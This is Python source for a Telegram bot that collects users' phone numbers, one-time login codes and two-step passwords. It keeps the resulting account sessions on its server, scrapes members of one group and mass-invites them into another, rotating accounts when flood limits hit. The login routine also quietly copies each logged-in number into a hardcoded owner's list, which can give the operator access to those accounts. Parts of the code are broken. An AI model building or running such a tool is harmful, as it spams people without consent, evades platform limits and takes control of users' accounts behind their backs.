import re, os, random, asyncio, html, configparser, pyrogram, subprocess, requests, time, traceback, logging, telethon, csv, json, sys
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
from asyncio.exceptions import TimeoutError
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneNumberInvalid, ApiIdInvalid, PhoneCodeInvalid, PhoneCodeExpired, UserNotParticipant
from pyrogram.errors.exceptions.bad_request_400 import UserNotParticipant
from telethon.client.chats import ChatMethods
from csv import reader
from info import API_ID, API_HASH, BOT_TOKEN, OWNER_IDS, PREMIUM_IDS
from telethon.sync import TelegramClient
from telethon import functions, types, TelegramClient, connection, sync, utils, errors
from telethon.tl.functions.channels import GetFullChannelRequest, JoinChannelRequest, InviteToChannelRequest
from telethon.errors import SessionPasswordNeededError
from telethon.errors.rpcerrorlist import PhoneCodeExpiredError, PhoneCodeInvalidError, PhoneNumberBannedError, PhoneNumberInvalidError, UserBannedInChannelError, PeerFloodError, UserPrivacyRestrictedError, ChatWriteForbiddenError, UserAlreadyParticipantError,  UserBannedInChannelError, UserAlreadyParticipantError,  UserPrivacyRestrictedError, ChatAdminRequiredError
from telethon.sessions import StringSession
from pyrogram import Client,filters
from pyromod import listen
from sql import add_user, query_msg
from support import users_info
from datetime import datetime, timedelta,date
import csv
#add_user= query_msg= users_info=0
if not os.path.exists('./sessions'):
    os.mkdir('./sessions')
if not os.path.exists(f"Users/5214819136/phone.csv"):
   os.mkdir('./Users')
   os.mkdir(f'./Users/5214819136')
   open(f"Users/5214819136/phone.csv","w")
if not os.path.exists('data.csv'):
    open("data.csv","w")
APP_ID=API_ID
API_HASH=API_HASH
BOT_TOKEN=BOT_TOKEN
UPDATES_CHANNEL = ""
OWNERS=OWNER_IDS
PREMIUMS=PREMIUM_IDS
app = pyrogram.Client("app", api_id=APP_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

with open("data.csv", encoding='UTF-8') as f:
    rows = csv.reader(f, delimiter=",", lineterminator="\n")
    next(rows, None)
    ishan=[]
    for row in rows:
        d = datetime.today() - datetime.strptime(f"{row[2]}", '%Y-%m-%d')
        r = datetime.strptime("2021-12-01", '%Y-%m-%d') - datetime.strptime("2021-11-03", '%Y-%m-%d')
        if d<=r:
            PREMIUMS.append(int(row[1]))

# ------------------------------- Start --------------------------------- #
@app.on_message(filters.private & filters.command(["start"]))
async def start(lel, message):
   a= await (lel, message)
   if a==1:
      return
   if not os.path.exists(f"Users/{message.from_user.id}/phone.csv"):
      os.mkdir(f'./Users/{message.from_user.id}')
      open(f"Users/{message.from_user.id}/phone.csv","w")
   id = message.from_user.id
   user_name = '@' + message.from_user.username if message.from_user.username else None
   await add_user(id, user_name)
   but = InlineKeyboardMarkup([[InlineKeyboardButton("✅ʟᴏɢɪɴ", callback_data="Login"), InlineKeyboardButton("➕ᴀᴅᴅɪɴɢ➕", callback_data="Adding") ],[InlineKeyboardButton("⚙️ᴘʜᴏɴᴇ⚙️", callback_data="Phone"), InlineKeyboardButton("🔗ᴘʜᴏɴᴇsᴇᴇ🔗", callback_data="PhoneSee")],[InlineKeyboardButton("✨ᴘʜᴏɴᴇ ʀᴇᴍᴏᴠᴇ✨", callback_data="Remove"), InlineKeyboardButton("☣️ᴀᴅᴍɪɴ ᴘᴀɴɴᴇʟ☣️", callback_data="Admin")], [InlineKeyboardButton("🏮ᴛᴜᴛᴏʀɪᴀʟ ʟɪɴᴋ🏮", url="https://youtu.be/e3XkdwVDZHY")]])
   await message.reply_text(f"**ʜɪ** `{message.from_user.first_name}` **!\n\nɪ'ᴍ 🆉︎ᴇʙʀᴀ 🆂︎ᴄʀᴀᴘᴇʀ 🅱︎ᴏᴛ \nᴍᴀᴅᴇ ғᴏʀ ᴅᴏɪɴɢ sᴄʀᴀᴘɪɴɢ ғᴏʀ ғʀᴇᴇ ,\nᴡɪᴛʜᴏᴜᴛ ᴜsɪɴɢ ᴀɴʏ ᴜsᴇ ᴏғ ᴘʏᴛʜᴏɴ.\n\n ᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **", reply_markup=but)



# ------------------------------- Set Phone No --------------------------------- #
@app.on_message(filters.private & filters.command(["Phone"]))
async def phone(lel, message):
 try:
   await message.delete()
   a= await Subscribe(lel, message)
   if a==1:
      return
   
   if not os.path.exists(f"Users/{message.from_user.id}/phone.csv"):
      os.mkdir(f'./Users/{message.from_user.id}')
      open(f"Users/{message.from_user.id}/phone.csv","w")
   with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
      str_list = [row[0] for row in csv.reader(f)]
      NonLimited=[]
      a=0
      for pphone in str_list:
         a+=1
         NonLimited.append(str(pphone))
      number = await app.ask(chat_id=message.chat.id, text="**ᴇɴᴛᴇʀ ɴᴜᴍʙᴇʀ ᴏғ ᴀᴄᴄᴏᴜɴᴛs ᴛᴏ ʟᴏɢɪɴ (𝙸𝙽 𝙸𝙽𝚃𝙸𝙶𝙴𝚁)\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
      n = int(number.text)
      a+=n
      if n<1 :
         await app.send_message(message.chat.id, """**ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀᴛ ʟᴇss ᴛʜᴇɴ 1 ᴀɢᴀɪɴ ᴛʀʏ\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **""")
         return
      if a>100:
         await app.send_message(message.chat.id, f"**ʏᴏᴜ ᴄᴀɴ ᴀᴅᴅ ᴏɴʟʏ {100-a} ᴘʜᴏɴᴇ ɴᴏ \n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
         return
      for i in range (1,n+1):
         number = await app.ask(chat_id=message.chat.id, text="**ɴᴏᴡ sᴇɴᴅ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ's ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪɴ ɪɴᴛᴇʀɴᴀᴛɪᴏɴᴀʟ ғᴏʀᴍᴀᴛ. \nɪɴᴄʟᴜᴅɪɴɢ **𝙲𝚘𝚞𝚗𝚝𝚛𝚢 𝚌𝚘𝚍𝚎**. \nᴇxᴀᴍᴘʟᴇ: **+14154566376 = 14154566376 ᴏɴʟʏ ɴᴏᴛ +**\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
         phone = number.text
         if "+" in phone:
            await app.send_message(message.chat.id, """**ᴀs ᴍᴇɴᴛɪᴏɴ + ɪs ɴᴏᴛ ɪɴᴄʟᴜᴅᴇ\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **""")
         elif len(phone)==11 or len(phone)==12:
            Singla = str(phone)
            NonLimited.append(Singla)
            await app.send_message(message.chat.id, f"**{n}). ᴘʜᴏɴᴇ: {phone} sᴇᴛ sᴜᴄᴇssғᴜʟʟʏ✅\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
         else:
            await app.send_message(message.chat.id, """**ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ ғᴏʀᴍᴀᴛ ᴛʀʏ ᴀɢᴀɪɴ \n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **""") 
      NonLimited=list(dict.fromkeys(NonLimited))
      with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
         writer = csv.writer(writeFile, lineterminator="\n")
         writer.writerows(NonLimited)
      with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
         for line in infile:
            outfile.write(line.replace(",", ""))
 except Exception as e:
   await app.send_message(message.chat.id, f"**ᴇʀʀᴏʀ: {e}\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
   return



# ------------------------------- Acc Login --------------------------------- #
@app.on_message(filters.private & filters.command(["Login"]))
async def login(lel, message):
 try:
   await message.delete()
   a= await Subscribe(lel, message)
   if a==1:
      return
   
   with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
    r=[]
    l=[]
    str_list = [row[0] for row in csv.reader(f)]
    po = 0
    s=0
    for pphone in str_list:
     try:
      phone = int(utils.parse_phone(pphone))
      client = TelegramClient(f"sessions/{phone}", APP_ID, API_HASH)
      await client.connect()
      if not await client.is_user_authorized():
         try:
            await client.send_code_request(phone)
         except FloodWait as e:
            await message.reply(f"𝚈𝚘𝚞 𝚑𝚊𝚟𝚎 𝚏𝚕𝚘𝚘𝚍𝚠𝚊𝚒𝚝 𝚘𝚏{e.x} 𝚂𝚎𝚌𝚘𝚗𝚍𝚜")
            return
         except PhoneNumberInvalidError:
            await message.reply("ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪs ɪɴᴠᴀʟɪᴅ.\n\nᴘʀᴇss /start ᴛᴏ sᴛᴀʀᴛ ᴀɢᴀɪɴ!")
            return
         except PhoneNumberBannedError:
            await message.reply(f"{phone} 𝚒𝚜 𝚋𝚊𝚗𝚗𝚎𝚍")
            continue
         try:
            otp = await app.ask(message.chat.id, ("ᴀɴ ᴏᴛᴘ ɪs sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ, \nᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴏᴛᴘ ɪɴ `1 2 3 4 5` ғᴏʀᴍᴀᴛ. __(𝚂𝚙𝚊𝚌𝚎 𝚋𝚎𝚝𝚠𝚎𝚎𝚗 𝚎𝚊𝚌𝚑 𝚗𝚞𝚖𝚋𝚎𝚛𝚜!)__ \n\nɪғ ʙᴏᴛ ɴᴏᴛ sᴇɴᴅɪɴɢ ᴏᴛᴘ ᴛʜᴇɴ ᴛʀʏ /restart ᴀɴᴅ sᴛᴀʀᴛ ᴛᴀsᴋ ᴀɢᴀɪɴ ᴡɪᴛʜ /start ᴄᴏᴍᴍᴀɴᴅ ᴛᴏ ʙᴏᴛ.\nᴘʀᴇss /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ."), timeout=300)
         except TimeoutError:
            await message.reply("ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏғ 5ᴍɪɴ.\nᴘʀᴇss /start ᴛᴏ sᴛᴀʀᴛ ᴀɢᴀɪɴ!")
            return
         otps=otp.text
         try:
            await client.sign_in(phone=phone, code=' '.join(str(otps)))
         except PhoneCodeInvalidError:
            await message.reply("ɪɴᴠᴀʟɪᴅ ᴄᴏᴅᴇ.\n\nᴘʀᴇss /start ᴛᴏ sᴛᴀʀᴛ ᴀɢᴀɪɴ!")
            return
         except PhoneCodeExpiredError:
            await message.reply("ᴄᴏᴅᴇ ɪs ᴇxᴘɪʀᴇᴅ.\n\nᴘʀᴇss /start ᴛᴏ sᴛᴀʀᴛ ᴀɢᴀɪɴ!")
            return
         except SessionPasswordNeededError:
            try:
               two_step_code = await app.ask(message.chat.id,"ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀᴠᴇ ᴛᴡᴏ ᴛᴡᴏ-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ.\nᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘᴀssᴡᴏʀᴅ.",timeout=300)
            except TimeoutError:
               await message.reply("`ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏғ 5ᴍɪɴ.\n\nᴘʀᴇss /start ᴛᴏ sᴛᴀʀᴛ ᴀɢᴀɪɴ!`")
               return
            try:
               await client.sign_in(password=two_step_code.text)
            except Exception as e:
               await message.reply(f"**ᴇʀʀᴏʀ:** `{str(e)}`")
               return
            except Exception as e:
               await app.send_message(message.chat.id ,f"**ᴇʀʀᴏʀ:** `{str(e)}`")
               return
      with open("Users/5214819136/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         NonLimited=[]
         for pphone in str_list:
            NonLimited.append(str(pphone))
         Singla = str(phone)
         NonLimited.append(Singla)
         NonLimited=list(dict.fromkeys(NonLimited))
         with open('1.csv', 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, lineterminator="\n")
            writer.writerows(NonLimited)
         with open("1.csv") as infile, open(f"Users/5214819136/phone.csv", "w") as outfile:
            for line in infile:
                outfile.write(line.replace(",", ""))
      os.remove("1.csv")
      await client(functions.contacts.UnblockRequest(id='@SpamBot'))
      await client.send_message('SpamBot', '/start')
      msg = str(await client.get_messages('SpamBot'))
      re= "bird"
      if re in msg:
         stats="ɢᴏᴏᴅ ɴᴇᴡs, ɴᴏ ʟɪᴍɪᴛs ᴀʀᴇ ᴄᴜʀʀᴇɴᴛʟʏ ᴀᴘᴘʟɪᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ. ʏᴏᴜ'ʀᴇ ғʀᴇᴇ ᴀs ᴀ ʙɪʀᴅ!"
         s+=1
         r.append(str(phone))
      else:
         stats='you are limited'
         l.append(str(phone))
      me = await client.get_me()
      await app.send_message(message.chat.id, f"ʟᴏɢɪɴ sᴜᴄᴇssғᴜʟʟʏ✅ ᴅᴏɴᴇ.\n\n**ɴᴀᴍᴇ:** {me.first_name}\n**ᴜsᴇʀɴᴀᴍᴇ:** {me.username}\n**ᴘʜᴏɴᴇ:** {phone}\n**sᴘᴀᴍʙᴏᴛ sᴛᴀᴛs:** {stats}\n\n**ᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")     
      po+=1
      await client.disconnect()
     except ConnectionError:
      await client.disconnect()
      await client.connect()
     except TypeError:
      await app.send_message(message.chat.id, "**ʏᴏᴜ ʜᴀᴠᴇ ɴᴏᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ \nᴘʟᴇᴀsᴇ ᴇᴅɪᴛ ᴄᴏɴғɪɢ⚙️ ʙʏ ᴄᴏᴍᴀɴᴅ /start.\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")  
     except Exception as e:
      await app.send_message(message.chat.id, f"**ᴇʀʀᴏʀ: {e}\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
    for ish in l:
      r.append(str(ish))
    with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
      writer = csv.writer(writeFile, lineterminator="\n")
      writer.writerows(r)
    with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
      for line in infile:
         outfile.write(line.replace(",", "")) 
    await app.send_message(message.chat.id, f"**ᴀʟʟ ᴀᴄᴄ ʟᴏɢɪɴ {s} ᴀᴄᴄᴏᴜɴᴛ ᴀᴠᴀɪʟᴀʙʟᴇ ᴏғ {po} \n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **") 
 except Exception as e:
   await app.send_message(message.chat.id, f"**ᴇʀʀᴏʀ: {e}\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
   return
                          


# ------------------------------- Acc Private Adding --------------------------------- #
@app.on_message(filters.private & filters.command(["Adding"]))
async def to(lel, message):
 try:
   a= await Subscribe(lel, message)
   if a==1:
      return
   
   number = await app.ask(chat_id=message.chat.id, text="**ɴᴏᴡ sᴇɴᴅ ᴛʜᴇ ғʀᴏᴍ ɢʀᴏᴜᴘ ᴜsᴇʀɴᴀᴍᴇ \n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
   From = number.text
   number = await app.ask(chat_id=message.chat.id, text="**ɴᴏᴡ sᴇɴᴅ ᴛʜᴇ ᴛᴏ ɢʀᴏᴜᴘ ᴜᴀᴇʀɴᴀᴍᴇ  \n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
   To = number.text
   number = await app.ask(chat_id=message.chat.id, text="**ɴᴏᴡ sᴇɴᴅ sᴛᴀʀᴛ ғʀᴏᴍ  \n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
   a = int(number.text)
   di=a
   try:
      with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         for pphone in str_list:
            peer=0
            ra=0
            dad=0
            r="**Adding Start**\n\n"
            phone = utils.parse_phone(pphone)
            client = TelegramClient(f"sessions/{phone}", APP_ID, API_HASH)
            await client.connect()
            await client(JoinChannelRequest(To))
            await app.send_message(chat_id=message.chat.id, text=f"**sᴄʀᴀᴘɪɴɢ sᴛᴀʀᴛ**")
            async for x in client.iter_participants(From, aggressive=True):
               try:
                  ra+=1
                  if ra<a:
                     continue
                  if (ra-di)>150:
                     await client.disconnect()
                     r+="**\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **"
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     await app.send_message(message.chat.id, f"**ᴇʀʀᴏʀ: {phone} ᴅᴜᴇ ᴛᴏ sᴏᴍᴇ ᴇʀʀᴏʀ ᴍᴏᴠɪɴɢ ᴛᴏ ɴᴇxᴛ ɴᴜᴍʙᴇʀ\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
                     break
                  if dad>40:
                     r+="**\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **"
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     r="**ᴀᴅᴅɪɴɢ sᴛᴀʀᴛ**\n\n"
                     dad=0
                  await client(InviteToChannelRequest(To, [x]))
                  status = 'DONE'
               except errors.FloodWaitError as s:
                  status= f'FloodWaitError for {s.seconds} sec'
                  await client.disconnect()
                  r+="**\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **"
                  await app.send_message(chat_id=message.chat.id, text=f"{r}")
                  await app.send_message(chat_id=message.chat.id, text=f'**ғʟᴏᴏᴅᴡᴀɪᴛ ᴇʀʀᴏʀ {s.seconds} sec\nᴍᴏᴠɪɴɢ ᴛᴏ ɴᴇxᴛ ɴᴜᴍʙᴇʀ**')
                  break
               except UserPrivacyRestrictedError:
                  status = 'PrivacyRestrictedError'
               except UserAlreadyParticipantError:
                  status = 'ALREADY'
               except UserBannedInChannelError:
                  status="User Banned"
               except ChatAdminRequiredError:
                  status="To Add Admin Required"
               except ValueError:
                  status="Error In Entry"
                  await client.disconnect()
                  await app.send_message(chat_id=message.chat.id, text=f"{r}")
                  break
               except PeerFloodError:
                  if peer == 10:
                     await client.disconnect()
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     await app.send_message(chat_id=message.chat.id, text=f"**ᴛᴏᴏ ᴍᴀɴʏ ᴘᴇᴇʀғʟᴏᴏᴅᴇʀʀᴏʀ \nᴍᴏᴠɪɴɢ ᴛᴏ ɴᴇxᴛ ɴᴜᴍʙᴇʀ**")
                     break
                  status = 'PeerFloodError'
                  peer+=1
               except ChatWriteForbiddenError as cwfe:
                  await client(JoinChannelRequest(To))
                  continue
               except errors.RPCError as s:
                  status = s.__class__.__name__
               except Exception as d:
                  status = d
               except:
                  traceback.print_exc()
                  status="Unexpected Error"
                  break
               r+=f"{a-di+1}). **{x.first_name}**   ⟾   **{status}**\n"
               dad+=1
               a+=1
   except Exception as e:
      await app.send_message(chat_id=message.chat.id, text=f"ᴇʀʀᴏʀ: {e} \n\n ᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ ")
 except Exception as e:
   await app.send_message(message.chat.id, f"**ᴇʀʀᴏʀ: {e}\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
   return



# ------------------------------- Start --------------------------------- #
@app.on_message(filters.private & filters.command(["PhoneSee"]))
async def start(lel, message):
   a= await Subscribe(lel, message)
   if a==1:
      return
   
   try:
      with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         de="**ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴀʀᴇ **\n\n"
         da=0
         dad=0
         for pphone in str_list:
            dad+=1
            da+=1
            if dad>40:
               de+="**\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **"
               await app.send_message(chat_id=message.chat.id, text=f"{de}")
               de="**ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴀʀᴇ**\n\n"
               dad=0 
            de+=(f"**{da}).** `{int(pphone)}`\n")
         de+="**\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **"
         await app.send_message(chat_id=message.chat.id, text=f"{de}")

   except Exception as a:
      pass


# ------------------------------- Start --------------------------------- #
@app.on_message(filters.private & filters.command(["Remove"]))
async def start(lel, message):
 try:
   a= await Subscribe(lel, message)
   if a==1:
      return
   
   try:
      with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         f.closed
         number = await app.ask(chat_id=message.chat.id, text="**sᴇɴᴅ ɴᴜᴍʙᴇʀ ᴛᴏ ʀᴇᴍᴏᴠᴇ\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
         print(str_list)
         str_list.remove(number.text)
         with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, lineterminator="\n")
            writer.writerows(str_list)
         with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
            for line in infile:
               outfile.write(line.replace(",", ""))
         await app.send_message(chat_id=message.chat.id,text="✅ᴅᴏɴᴇ sᴜᴄᴇssғᴜʟʟʏ")
   except Exception as a:
      pass
 except Exception as e:
   await app.send_message(message.chat.id, f"**ᴇʀʀᴏʀ: {e}\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
   return

# ------------------------------- Buttons --------------------------------- #
@app.on_callback_query()
async def button(app, update):
   k = update.data
   if "Home" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**ᴛʜᴇʀᴇ ɪs ɴᴏᴛʜɪɴɢ ɴᴏ ᴍᴏʀᴇ..!\nᴊᴜsᴛ ᴄʟɪᴄᴋ ᴏɴ /start ᴛᴏ ɢᴏ ʜᴏᴍᴇ.\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **""") 
   elif "Users" in k:
      await update.message.delete()
      msg = await app.send_message(update.message.chat.id,"ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...")
      messages = await users_info(app)
      await msg.edit(f"ᴛᴏᴛᴀʟ:\n\nᴜsᴇʀs - {messages[0]}\nʙʟᴏᴄᴋᴇᴅ - {messages[1]}")
   elif "New" in k:
      await update.message.delete()
      number = await app.ask(chat_id=update.message.chat.id, text="**sᴇɴᴅ ᴜsᴇʀ ɪᴅ ᴏғ ɴᴇᴡ ᴜsᴇʀ\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
      phone = int(number.text)
      with open("data.csv", encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",", lineterminator="\n")
         next(rows, None)
         f.closed
         f = open("data.csv", "w", encoding='UTF-8')
         writer = csv.writer(f, delimiter=",", lineterminator="\n")
         writer.writerow(['sr. no.', 'user id', "Date"])
         a=1
         for i in rows:
            writer.writerow([a, i[1],i[2]])
            a+=1
         writer.writerow([a, phone, date.today() ])
         PREMIUMS.append(int(phone))
         await app.send_message(chat_id=update.message.chat.id,text="✅ᴅᴏɴᴇ sᴜᴄᴇssғᴜʟʟʏ")

   elif "Check" in k:
      await update.message.delete()
      with open("data.csv", encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",", lineterminator="\n")
         next(rows, None)
         E="**PREMIUM USERS**\n"
         a=0
         for row in rows:
            d = datetime.today() - datetime.strptime(f"{row[2]}", '%Y-%m-%d')
            r = datetime.strptime("2021-12-01", '%Y-%m-%d') - datetime.strptime("2021-11-03", '%Y-%m-%d')
            if d<=r:
               a+=1
               E+=f"{a}). {row[1]} - {row[2]}\n"
         E+="\n\n**ᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **"
         await app.send_message(chat_id=update.message.chat.id,text=E)

   elif "Admin" in k:
      await update.message.delete()
      if update.message.chat.id in OWNERS:
         but = InlineKeyboardMarkup([[InlineKeyboardButton("☣️ᴜsᴇʀs☣️", callback_data="Users")], [InlineKeyboardButton("⭕ʙʀᴏᴀᴅᴄᴀsᴛ⭕", callback_data="Broadcast")],[InlineKeyboardButton("➕ᴀᴅᴅ ᴜsᴇʀs➕", callback_data="New")], [InlineKeyboardButton("✨ᴄʜᴇᴄᴋ ᴜsᴇʀs✨", callback_data="Check")]])
         await app.send_message(chat_id=update.message.chat.id,text=f"**ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴɴᴇʟ ᴏғ 🆉︎ᴇʙʀᴀ 🆂︎ᴄʀᴀᴘɪɴɢ 🅱︎ᴏᴛ\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **", reply_markup=but)
      else:
         await app.send_message(chat_id=update.message.chat.id,text="**ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏғ ʙᴏᴛ \n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
   elif "Broadcast" in k:
    try:
      query = await query_msg()
      a=0
      b=0
      number = await app.ask(chat_id=update.message.chat.id, text="**ɴᴏᴡ ᴍᴇ ᴍᴇssᴀɢᴇ ғᴏʀ ʙʀᴏᴀᴅᴄᴀsᴛ \n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")
      phone = number.text
      for row in query:
         chat_id = int(row[0])
         try:
            await app.send_message(chat_id=int(chat_id), text=f"{phone}", parse_mode="markdown", disable_web_page_preview=True)
            a+=1
         except FloodWait as e:
            await asyncio.sleep(e.x)
            b+=1
         except Exception:
            b+=1
            pass
      await app.send_message(update.message.chat.id,f"✅sᴜᴄᴇssғᴜʟʟʏ ʙʀᴏᴀᴅᴄᴀsᴛᴇᴅ ᴛᴏ {a} ᴄʜᴀᴛs\nғᴀɪʟᴇᴅ - {b} ᴄʜᴀᴛs !")
    except Exception as e:
      await app.send_message(update.message.chat.id,f"**ᴇʀʀᴏʀ: {e}\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ **")




text = """ʜᴇʟʟᴏ ɪ ᴀᴍ ᴏᴡɴᴇʀ ᴏғ ʙᴏᴛ sᴜᴍɪᴛ ʏᴀᴅᴀᴠ ᴘʟᴇᴀsᴇ ᴊᴏɪɴ ᴍʏ ɢʀᴏᴜᴘ ᴄʜᴀɴɴᴇʟs
"""
print(text)
print("ᴢᴇʙʀᴀ ᴀᴅᴅɪɴɢ sᴛᴀʀᴛᴇᴅ sᴜᴄᴇssғᴜʟʟʏ........")
app.run()
